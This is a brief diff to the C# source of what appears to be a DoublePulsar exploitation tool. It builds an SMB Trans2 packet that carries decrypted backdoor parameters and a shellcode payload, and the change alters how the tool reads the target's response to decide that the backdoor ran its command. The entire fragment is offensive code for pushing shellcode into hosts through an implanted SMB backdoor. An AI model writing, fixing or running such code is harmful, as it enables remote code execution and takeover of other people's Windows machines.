@@ -767,8 +767,9 @@ namespace DoublePulsar
                 byte[] xor_doublepulsar_parameters = XorDecryptFunc(byte_doublepulsar_parameters, (int)key);
 
                 byte[] doublepulsar_exploit_pkt = MakeTrans2Packet(sock, header.TID, header.UID, xor_doublepulsar_parameters, payload_shellcode);
+                //header = new SMB_HEADER();
                 header = SMB_HeaderFromBytes(doublepulsar_exploit_pkt);
-                if (header.MID == 0x82)
+                if (header.MID == 82) /* 0x52 in hex */
                 {
                     Console.WriteLine("It appears that DoublePulsar processed the command successfully!\n");
                 }
